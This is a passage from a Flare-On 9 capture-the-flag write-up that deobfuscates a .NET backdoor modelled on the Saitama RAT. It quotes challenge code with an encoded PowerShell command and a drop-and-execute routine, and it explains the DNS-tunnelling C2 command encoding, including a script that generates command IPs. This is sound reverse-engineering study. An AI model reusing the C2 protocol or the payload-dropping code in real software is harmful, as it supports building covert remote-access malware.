That’s how we have the offset where each function starts. Yet, as we mentioned before, this offset is not exactly the offset where the patch is to be applied – there is still a header. And to make things more complicated, multiple different versions of header are possible, with different lengths.

Still, I could retrieve the original (obfuscated) function’s body with .NET reflection. So, as a workaround of the mentioned problem, I decided to just search where the obfuscated function’s body is located in the file, starting from the function’s offset.

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | byte\[\] currentBody = methodBody.GetILAsByteArray(); |
|  | if (currentBody.Length != decChunk.Length) |
|  | { |
|  | Console.WriteLine("Length mismatch: {0:X} {1}", metadataToken, mi.Name); |
|  | continue; |
|  | } |
|  | // offset where the method body starts (headers may have various sizes) |
|  | int bodyOffset = 0; |
|  | for (var i = offset; i < (offset + hdrSize + decChunk.Length); i++) |
|  | { |
|  | //memcmp: |
|  |  |
|  | bool isOk = true; |
|  | for (var k = 0; k < decChunk.Length; k++) |
|  | { |
|  | if (fileBuf\[i + k\] != currentBody\[k\]) |
|  | { |
|  | isOk = false; |
|  | break; |
|  | } |
|  | } |
|  | if (isOk) |
|  | { |
|  | bodyOffset = i; |
|  | break; |
|  | } |
|  |  |
|  | } |
|  | if (bodyOffset == 0) |
|  | { |
|  | Console.WriteLine("Function body not found: {0:X} {1}", metadataToken, mi.Name); |
|  | continue; |
|  | } |
|  | // apply the patch on the file buffer: |
|  | Buffer.BlockCopy(decChunk, 0, fileBuf, bodyOffset, decChunk.Length) |

[view raw](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54/raw/31c0beeafc4a52b16f81dfbc8560ff2fbfdd85eb/find_and_patch.cs) [find\_and\_patch.cs](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54#file-find_and_patch-cs)
hosted with ❤ by [GitHub](https://github.com/)

I dumped the patched file on the disk, and finally, the whole code decompiles!

## Analysis of the decompiled application

I saved the decompiled dnSpy project, and it turns out, that after some trivial cleaning, it became possible to even compile it back to the binary. The sourcecode of my decompiled and cleaned version is available here:

- [https://github.com/hasherezade/flareon2022/tree/main/task8/FlareOn.Backdoor\_deobfuscated/FlareOn.Backdoor](https://github.com/hasherezade/flareon2022/tree/main/task8/FlareOn.Backdoor_deobfuscated/FlareOn.Backdoor)

Working on the code gives much more flexibility – allows to add logs, quickly rename the functions and variables, etc. So overall, the understanding of the whole logic is a lot easier.

One thing that was very helpful in the analysis, was noticing that the challenge is actually based on Saitama malware.

I’ve got Saitama Agent from Virus Total ( [79c7219ba38c5a1971a32b50e14d4a13](https://www.virustotal.com/gui/file/e0872958b8d3824089e5e1cfab03d9d98d22b9bcb294463818d721380075a52d/details)).

Decompiling both applications, and comparing them side by side, allowed me very quickly to notice what parts are added by the challenge authors, and where the flag can be located. Additionally, in contrast to the FlareOn task, Saitama’s code is not obfuscated, and functions have meaningful names. So, following them, and renaming all the functions in the challenge to the same names as in Saitama, was an easy way to understand the whole functionality.

The main function of the Saitama Agent gives right away the hint that we are dealing with a state machine, and what functionality is it going to provide:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/saitama_main.png)

The same state machine, and analogous functions, we can find in the deobfuscated challenge executable:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/chall_statemachine.png)

There are already some writeups available detailing how Saitama’s state machine work, i.e. [https://x-junior.github.io/malware%20analysis/2022/06/24/Apt34.html](https://x-junior.github.io/malware%20analysis/2022/06/24/Apt34.html)

Following the Saitama code, and renaming the matching functions, I produced the cleaned version of the challenge. It will be also helpful for further experiments and better understanding of inner workings of the app. The final version of the processed code (including modifications that are described further in this writeup), is given here:

- [https://github.com/hasherezade/flareon2022/tree/main/task8/FlareOn.Backdoor\_dobfuscated\_cleaned/FlareOn.Backdoor](https://github.com/hasherezade/flareon2022/tree/main/task8/FlareOn.Backdoor_dobfuscated_cleaned/FlareOn.Backdoor)

### How it works

Saitama is a RAT that executes various commands requested by the Command-and-Control (C2) server. The C2 communication is encoded as DNS requests/responses. Details about how they are encoded are described [here](https://web.archive.org/web/20220602031828/https://www.socinvestigation.com/how-the-apt34-uses-saitama-backdoor-for-dns-tunnelling/) and [here](https://www.malwarebytes.com/blog/news/2022/05/how-the-saitama-backdoor-uses-dns-tunnelling).

The agent installed on the victim machine sends to the C2 some domain to be “resolved”. In reality the it is a keep alive token, showing that the agent is active and waiting for commands. Just like a normal DNS, the C2 responds with an IP address – however, those IPs are in reality commands, just wrapped in a custom format.

Our challenge works exactly the same – sends to the C2 requests to resolve generated domains, ending with `flare-on.com`, and then parse the response.

The function responsible for executing the requested tasks: [https://github.com/hasherezade/flareon2022/blob/main/task8/FlareOn.Backdoor\_dobfuscated\_cleaned/FlareOn.Backdoor/TaskClass.cs#L199](https://github.com/hasherezade/flareon2022/blob/main/task8/FlareOn.Backdoor_dobfuscated_cleaned/FlareOn.Backdoor/TaskClass.cs#L199) .

As we can see, tasks are identified by their IDs, given as ASCII strings.

The task ID is retrieved from the DNS response. First, the length of the next response (that will carry the command) is be retrieved, in form of an IP. The IP addresses that carry the size must start with a chunk with a value >= 128. (See the code [here](https://github.com/hasherezade/flareon2022/blob/bced25efe87a30585bcadfda90adfe67b2efb9e3/task8/FlareOn.Backdoor_dobfuscated_cleaned/FlareOn.Backdoor/DnsClass.cs#L616)).

Then, in the next IP, the command itself is passed. The first chunk of the IP address defines the command type, as given in [the enum](https://github.com/hasherezade/flareon2022/blob/main/task8/FlareOn.Backdoor_dobfuscated_cleaned/FlareOn.Backdoor/Enums.cs#L36). We will be using command type 43 (`Static`), which means plaintext. Then, in the next chunks of the IP, follows the command ID in ASCII.

The output of the successfully executed command will be saved in a file named: `flare.agent.recon.[unique_id]`. Example:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/cmd_out-1.png?w=579)

### Finding where the flag is decoded

By processing the code, it was also easy to notice where the authors added their custom code. In the function analogous to Saitama’s `DoTask` we can see some chunks being appended to an internal buffer on each command execution. Example:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7 | `bool``flag27 = text ==``"17"``;`<br>`if``(flag27)`<br>`{`<br>```TaskClass.AppendFlagKeyChunk(``int``.Parse(text),``"2e4"``);`<br>```//$.(.p.i.n.g. .-.n. .1. .1.0...6.5...4.5...1.8. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...2.8...4.1. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...3.6...1.3. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.;.$.(.p.i.n.g. .-.n. .1. .1.0...6.5...5.1...1.0. .|. .f.i.n.d.s.t.r. ./.i. .t.t.l.). .-.e.q. .$.n.u.l.l.`<br>```text = Cmd.Powershell(``"JAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANAA1AC4AMQA4ACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwAOwAkACgAcABpAG4AZwAgAC0AbgAgADEAIAAxADAALgA2ADUALgAyADgALgA0ADEAIAB8ACAAZgBpAG4AZABzAHQAcgAgAC8AaQAgAHQAdABsACkAIAAtAGUAcQAgACQAbgB1AGwAbAA7ACQAKABwAGkAbgBnACAALQBuACAAMQAgADEAMAAuADYANQAuADMANgAuADEAMwAgAHwAIABmAGkAbgBkAHMAdAByACAALwBpACAAdAB0AGwAKQAgAC0AZQBxACAAJABuAHUAbABsADsAJAAoAHAAaQBuAGcAIAAtAG4AIAAxACAAMQAwAC4ANgA1AC4ANQAxAC4AMQAwACAAfAAgAGYAaQBuAGQAcwB0AHIAIAAvAGkAIAB0AHQAbAApACAALQBlAHEAIAAkAG4AdQBsAGwA"``);`<br>```TaskClass.CommandsAndMethods.AppendData(Encoding.ASCII.GetBytes(TaskClass.GetMethodNamesFromStack() + text));` |

[https://github.com/hasherezade/flareon2022/blob/main/task8/FlareOn.Backdoor\_dobfuscated\_cleaned/FlareOn.Backdoor/TaskClass.cs#L353](https://github.com/hasherezade/flareon2022/blob/main/task8/FlareOn.Backdoor_dobfuscated_cleaned/FlareOn.Backdoor/TaskClass.cs#L353)

We can see that on each chunk being appended to the buffer, some value from a hardcoded buffer `Util.c` is being removed:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31 | `// Token: 0x06000097 RID: 151 RVA: 0x00004C6C File Offset: 0x0000BC6C`<br>`public``static``void``_AppendFlagKeyChunk(``int``i,``string``s)`<br>`{`<br>```bool``flag = Util.c.Count != 0 && Util.c[0] == (i ^ 248);`<br>```if``(flag)`<br>```{`<br>```TaskClass.FlagSectionNameHash += s;`<br>```Util.c.Remove(i ^ 248);`<br>```}`<br>```else`<br>```{`<br>```TaskClass._someFlag =``false``;`<br>```}`<br>`}`<br>`// Token: 0x06000098 RID: 152 RVA: 0x00004CD0 File Offset: 0x0000BCD0`<br>`public``static``void``AppendFlagKeyChunk(``int``i,``string``s)`<br>`{`<br>```try`<br>```{`<br>```TaskClass._AppendFlagKeyChunk(i, s);`<br>```}`<br>```catch``(InvalidProgramException e)`<br>```{`<br>```Util.flare_70(e,``new``object``[]`<br>```{`<br>```i,`<br>```s`<br>```});`<br>```}`<br>`}` |

`Util.c` is an observable collection, initialized with the following values:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24 | `Util.c =``new``ObservableCollection<``int``>`<br>`{`<br>```250,`<br>```242,`<br>```240,`<br>```235,`<br>```243,`<br>```249,`<br>```247,`<br>```245,`<br>```238,`<br>```232,`<br>```253,`<br>```244,`<br>```237,`<br>```251,`<br>```234,`<br>```233,`<br>```236,`<br>```246,`<br>```241,`<br>```255,`<br>```252`<br>`};` |

When the collection gets emptied, the following function is executed:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19 | `// Token: 0x06000095 RID: 149 RVA: 0x00004B94 File Offset: 0x0000BB94`<br>`public``static``void``_DecodeAndSaveFlag()`<br>`{`<br>```byte``[] sectionContent = Util.FindSectionStartingWithHash(TaskClass.ReverseString(TaskClass.FlagSectionNameHash));`<br>```byte``[] hash = TaskClass.CommandsAndMethods.GetHashAndReset();`<br>```byte``[] flagContent = FLARE12.RC4(hash, sectionContent);`<br>```string``text = Path.GetTempFileName() + Encoding.UTF8.GetString(FLARE12.RC4(hash,``new``byte``[]`<br>```{`<br>```31,`<br>```29,`<br>```40,`<br>```72`<br>```}));`<br>```using``(FileStream fileStream =``new``FileStream(text, FileMode.Create, FileAccess.Write, FileShare.Read))`<br>```{`<br>```fileStream.Write(flagContent, 0, flagContent.Length);`<br>```}`<br>```Process.Start(text);`<br>`}` |

This function drops and executes some file, and we can guess at this point that this is where the flag is located.

So, by analyzing the above function, we know that:

- the flag is RC4 encrypted, and stored in one of the PE sections
- this section’s name matches the beginning of the reversed string, that was made of the collected chunks
- the chunks are collected when the command is executed, so, in order to get the proper string, we need to execute them in a proper order
- we need to preserve the original callstack, because it will be used to generate the hash, that is used as the RC4 password – so, we should use the original, unpatched binary.

### Finding and encoding the valid command sequence

Although in order to obtain the valid flag we need the original binary, still, the recompiled one will be very helpful for some experiments, testing assumptions, and figuring out the valid commands sequence.

My first assumption is that the elements in the observable collection `Util.c` have to be removed in the same order as they are defined, so, they will give us the answer to the question in which order the commands should be run. So, by looping over the full list, and XOR-ing each value with the value `248` (as in the function referenced as `_AppendFlagKeyChunk`) we obtain each command ID. Now we just have to encode those commands as IP addresses – as the Saitama communication protocol defines. This is the sequence works,the decoder that generates proper IPs sequence:

This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

[Show hidden characters](https://hshrzd.wordpress.com/)

|     |     |
| --- | --- |
|  | static void decodeIndexes() |
|  | { |
|  | byte\[\] indexes = { |
|  | 250, |
|  | 242, |
|  | 240, |
|  | 235, |
|  | 243, |
|  | 249, |
|  | 247, |
|  | 245, |
|  | 238, |
|  | 232, |
|  | 253, |
|  | 244, |
|  | 237, |
|  | 251, |
|  | 234, |
|  | 233, |
|  | 236, |
|  | 246, |
|  | 241, |
|  | 255, |
|  | 252 |
|  | }; |
|  |  |
|  | List<string> resolved = new List<string>(); |
|  | for (var i = 0; i < indexes.Length; i++) |
|  | { |
|  | var val = indexes\[i\] ^ 248; |
|  | //make IP |
|  | string str = val.ToString(); |
|  | byte\[\] a = Encoding.ASCII.GetBytes(str); |
|  | string lenIP = String.Format("199.0.0.{0}", str.Length + 1); |
|  | resolved.Add(lenIP); |
|  |  |
|  | string valIP = ""; |
|  | if (str.Length > 1) |
|  | { |
|  | valIP = String.Format("43.{0}.{1}.0", a\[0\], a\[1\]); |
|  | } |
|  | else |
|  | { |
|  | valIP = String.Format("43.{0}.0.0", a\[0\]); |
|  | } |
|  | resolved.Add(valIP); |
|  | } |
|  |  |
|  | for (var i = 0; i < resolved.Count; i++) |
|  | { |
|  | //Console.WriteLine("DomainsList.Add(\\"{0}\\");", resolved\[i\]); |
|  | Console.WriteLine("{0}", resolved\[i\]); |
|  | } |
|  | } |
|  | static void Main(string\[\] args) |
|  | { |
|  | decodeIndexes(); |
|  | } |

[view raw](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54/raw/31c0beeafc4a52b16f81dfbc8560ff2fbfdd85eb/decode_indexes.cs) [decode\_indexes.cs](https://gist.github.com/hasherezade/107a61eebb345313b34d1bb49f282f54#file-decode_indexes-cs)
hosted with ❤ by [GitHub](https://github.com/)

I obtained a list of domains, and modified the code of the recompiled crackme, in order to emulate the appropriate responses to the DNS requests.

The list:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48 | `public``static``void``initDomainsList()`<br>`{`<br>```DomainsList =``new``List<``string``>();`<br>```DomainsList.Add(``"200.0.0.1"``);``// Init id -> 1`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.50.0.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.48.0"``);`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.56.0.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.57.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.49.0"``);`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.49.0.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.53.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.51.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.50.50.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.54.0"``);`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.53.0.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.50.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.50.49.0"``);`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.51.0.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.56.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.55.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.50.48.0"``);`<br>```DomainsList.Add(``"199.0.0.3"``);`<br>```DomainsList.Add(``"43.49.52.0"``);`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.57.0.0"``);`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.55.0.0"``);`<br>```DomainsList.Add(``"199.0.0.2"``);`<br>```DomainsList.Add(``"43.52.0.0"``);`<br>`}` |

The modifications in the domain retrieving function, in order to fetch the domain from the list instead of making a DNS query:

|     |     |
| --- | --- |
| 1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25 | `// Token: 0x06000045 RID: 69 RVA: 0x00003820 File Offset: 0x0000A820`<br>`public``static``bool``DnsQuery(``out``byte``[] r)`<br>`{`<br>```bool``result =``true``;`<br>```r =``null``;`<br>```try`<br>```{`<br>```//IPHostEntry iphostEntry = Dns.Resolve(FLARE05.A);`<br>```//r = iphostEntry.AddressList[0].GetAddressBytes();`<br>```string``domainStr = DomainsList[DomainIndex % DomainsList.Count];`<br>```DomainIndex++;`<br>```IPAddress ip = IPAddress.Parse(domainStr);`<br>```r = ip.GetAddressBytes();`<br>```Console.WriteLine(``"IP: {0}.{1}.{2}.{3}"``, r[0], r[1], r[2], r[3]);`<br>```DnsClass._Try = 0;`<br>```Config._IncrementCounterAndWriteToFile();`<br>```}`<br>```catch`<br>```{`<br>```DnsClass._Try++;`<br>```result =``false``;`<br>```}`<br>```return``result;`<br>`}` |

I also patched out some sleeps to speed up the execution, and added more logging. Then I run my recompiled application, to verify if this is really the correct sequence to reach the flag decoding function.

WARNING: mind the fact that before running the application, it is required to remove all the previous files generated by the challenge, such as `flare.agent.id` etc, otherwise they will distort the sequence.

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/decode_flag_emulated-1.png)

And it works! So it is confirmed that the list of the IPs is valid. Also, the composed string leads to a section in the original PE, so the previous assumptions were correct:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/section_found.png?w=770)Found section where the RC4 encrypted flag is located

Now all we have to do is to feed the sequence of the DNS responses to the original app.

### Obtaining the flag

In order to obtain the flag, we will use the original application and feed into it the list of the resolved IPs.

At first I thought about using some fake DNS, but finally I decided to just make a hooking DLL (based on MS Detours) and inject it into the original app. This is my implementation:

[https://github.com/hasherezade/flareon2022/blob/main/task8/hooking\_dll/main.cpp](https://github.com/hasherezade/flareon2022/blob/main/task8/hooking_dll/main.cpp)

My app assume that there is a simple fake DNS running, giving a dummy response for any queried IP. So, I am just replacing the content of this response with the IP from the list. The cleaner solution would be to construct the full fake response from scratch, and make it independent from a dummy response, but I had [Apate DNS](https://fireeye.market/apps/211380) already running on my machine, and it was faster.

I injected the DLL into the executable using [dll\_injector](https://github.com/hasherezade/dll_injector):

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/dll_injected.png?w=888)

And now we can watch the IPs queried, and just wait for the flag to be dropped…

At the same time we can see the domains being listed by ApateDNS, where they first reach:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/apate_list.png?w=674)

After a while, this beautiful animated GIF is dropped to the TEMP, and popped out:

![](https://hshrzd.wordpress.com/wp-content/uploads/2022/11/flag_displayed.png?w=805)

So, the task is solved!

Posted in [CrackMe](https://hshrzd.wordpress.com/category/crackme/)\|Tagged [FlareOn](https://hshrzd.wordpress.com/tag/flareon/), [FlareOn9](https://hshrzd.wordpress.com/tag/flareon9/)\|[3 Comments](https://hshrzd.wordpress.com/2022/11/12/flare-on-9-task-8/#comments)

- Search for:

- ### Recent Posts

  - [Flare-On 12 – Task 8](https://hshrzd.wordpress.com/2025/11/25/flare-on-12-task-8/)
  - [Flare-On 12 – Task 9](https://hshrzd.wordpress.com/2025/11/20/flare-on-12-task-9/)
  - [Tutorial: unpacking executables with TinyTracer + PE-sieve](https://hshrzd.wordpress.com/2025/03/22/unpacking-executables-with-tinytracer-pe-sieve/)
  - [Process Hollowing on Windows 11 24H2](https://hshrzd.wordpress.com/2025/01/27/process-hollowing-on-windows-11-24h2/)
  - [Flare-On 11 – Task 7](https://hshrzd.wordpress.com/2024/12/09/flare-on-11-task-7/)
- ### Archives


  - [November 2025](https://hshrzd.wordpress.com/2025/11/) (2)
  - [March 2025](https://hshrzd.wordpress.com/2025/03/) (1)
  - [January 2025](https://hshrzd.wordpress.com/2025/01/) (1)
  - [December 2024](https://hshrzd.wordpress.com/2024/12/) (2)
  - [October 2024](https://hshrzd.wordpress.com/2024/10/) (2)
  - [March 2023](https://hshrzd.wordpress.com/2023/03/) (1)
  - [November 2022](https://hshrzd.wordpress.com/2022/11/) (1)
  - [October 2022](https://hshrzd.wordpress.com/2022/10/) (2)
  - [February 2022](https://hshrzd.wordpress.com/2022/02/) (1)
  - [January 2022](https://hshrzd.wordpress.com/2022/01/) (1)
  - [October 2021](https://hshrzd.wordpress.com/2021/10/) (3)
  - [January 2021](https://hshrzd.wordpress.com/2021/01/) (1)
  - [December 2020](https://hshrzd.wordpress.com/2020/12/) (1)
  - [September 2019](https://hshrzd.wordpress.com/2019/09/) (1)
  - [June 2019](https://hshrzd.wordpress.com/2019/06/) (1)
  - [January 2019](https://hshrzd.wordpress.com/2019/01/) (1)
  - [July 2018](https://hshrzd.wordpress.com/2018/07/) (1)
  - [April 2018](https://hshrzd.wordpress.com/2018/04/) (1)
  - [February 2018](https://hshrzd.wordpress.com/2018/02/) (1)
  - [January 2018](https://hshrzd.wordpress.com/2018/01/) (2)
  - [December 2017](https://hshrzd.wordpress.com/2017/12/) (2)
  - [November 2017](https://hshrzd.wordpress.com/2017/11/) (1)
  - [June 2017](https://hshrzd.wordpress.com/2017/06/) (4)
  - [May 2017](https://hshrzd.wordpress.com/2017/05/) (2)
  - [December 2016](https://hshrzd.wordpress.com/2016/12/) (1)
  - [November 2016](https://hshrzd.wordpress.com/2016/11/) (1)
  - [July 2016](https://hshrzd.wordpress.com/2016/07/) (3)
  - [June 2016](https://hshrzd.wordpress.com/2016/06/) (1)
  - [April 2016](https://hshrzd.wordpress.com/2016/04/) (1)
  - [March 2016](https://hshrzd.wordpress.com/2016/03/) (2)
  - [February 2016](https://hshrzd.wordpress.com/2016/02/) (1)
  - [October 2014](https://hshrzd.wordpress.com/2014/10/) (1)
  - [March 2014](https://hshrzd.wordpress.com/2014/03/) (1)
  - [February 2014](https://hshrzd.wordpress.com/2014/02/) (2)
  - [January 2014](https://hshrzd.wordpress.com/2014/01/) (1)
  - [November 2013](https://hshrzd.wordpress.com/2013/11/) (1)
  - [October 2013](https://hshrzd.wordpress.com/2013/10/) (1)
  - [September 2013](https://hshrzd.wordpress.com/2013/09/) (1)
  - [August 2013](https://hshrzd.wordpress.com/2013/08/) (1)
  - [July 2013](https://hshrzd.wordpress.com/2013/07/) (3)
  - [July 2012](https://hshrzd.wordpress.com/2012/07/) (1)
  - [May 2012](https://hshrzd.wordpress.com/2012/05/) (1)
  - [April 2012](https://hshrzd.wordpress.com/2012/04/) (1)
- ### Categories


  - [CONfidence](https://hshrzd.wordpress.com/category/confidence/) (3)

  - [CrackMe](https://hshrzd.wordpress.com/category/crackme/) (24)

  - [cryptography](https://hshrzd.wordpress.com/category/cryptography/) (1)

  - [CTF](https://hshrzd.wordpress.com/category/ctf/) (8)

  - [FlareOn](https://hshrzd.wordpress.com/category/ctf/flareon/) (6)

  - [KernelMode](https://hshrzd.wordpress.com/category/kernelmode/) (4)

  - [Malware](https://hshrzd.wordpress.com/category/malware/) (16)

  - [Malware Decryptor](https://hshrzd.wordpress.com/category/malware-decryptor/) (5)

  - [PE-bear](https://hshrzd.wordpress.com/category/pe-bear/) (12)

  - [Programming](https://hshrzd.wordpress.com/category/programming/) (6)

  - [Techniques](https://hshrzd.wordpress.com/category/techniques/) (5)

  - [Tools](https://hshrzd.wordpress.com/category/tools/) (10)

  - [Tutorial](https://hshrzd.wordpress.com/category/tutorial/) (17)

  - [Uncategorized](https://hshrzd.wordpress.com/category/uncategorized/) (3)

  - [WKE](https://hshrzd.wordpress.com/category/wke/) (3)
- ### Blog Stats


  - 2,174,329 hits
- ### All my works included here are licensed under:

[![Creative Commons Attribution-ShareAlike 3.0 Unported License](https://licensebuttons.net/l/by-sa/3.0/88x31.png)](http://creativecommons.org/licenses/by-sa/3.0/)

[hasherezade's 1001 nights](https://hshrzd.wordpress.com/ "Scroll back to top")

[Blog at WordPress.com.](https://wordpress.com/?ref=footer_blog)

- [Subscribe](https://hshrzd.wordpress.com/) [Subscribed](https://hshrzd.wordpress.com/)








  - [![](https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=50&d=https%3A%2F%2Fs0.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png) hasherezade's 1001 nights](https://hshrzd.wordpress.com/)

Join 121 other subscribers

Sign me up

  - Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fhshrzd.wordpress.com%2F2025%2F11%2F25%2Fflare-on-12-task-8%2F&signup_flow=account)


- - [![](https://secure.gravatar.com/blavatar/31e419d8016bccbbb154cb29c69d6e854cc6240f389eec2f4ab031294e82963a?s=50&d=https%3A%2F%2Fs0.wp.com%2Fi%2Flogo%2Fwpcom-gray-white.png) hasherezade's 1001 nights](https://hshrzd.wordpress.com/)
  - [Subscribe](https://hshrzd.wordpress.com/) [Subscribed](https://hshrzd.wordpress.com/)
  - [Sign up](https://wordpress.com/start/)
  - [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fhshrzd.wordpress.com%2F2025%2F11%2F25%2Fflare-on-12-task-8%2F&signup_flow=account)
  - [Report this content](https://wordpress.com/abuse/?report_url=https://hshrzd.wordpress.com)
  - [View site in Reader](https://wordpress.com/reader/feeds/2657455)
  - [Manage subscriptions](https://subscribe.wordpress.com/)
  - [Collapse this bar](https://hshrzd.wordpress.com/)

ClosePrevious

![](https://hshrzd.wordpress.com/)

![](https://hshrzd.wordpress.com/)

Next

[Toggle photo metadata visibility](https://hshrzd.wordpress.com/#)[Toggle photo comments visibility](https://hshrzd.wordpress.com/#)

Loading Comments...

Write a Comment...

Email (Required)Name (Required)Website

![](https://pixel.wp.com/g.gif?blog=35018075&v=wpcom&tz=2&user_id=0&arch_home=1&subd=hshrzd&host=hshrzd.wordpress.com&ref=https%3A%2F%2Fwww.google.com%2F&rand=0.11648171418880027)
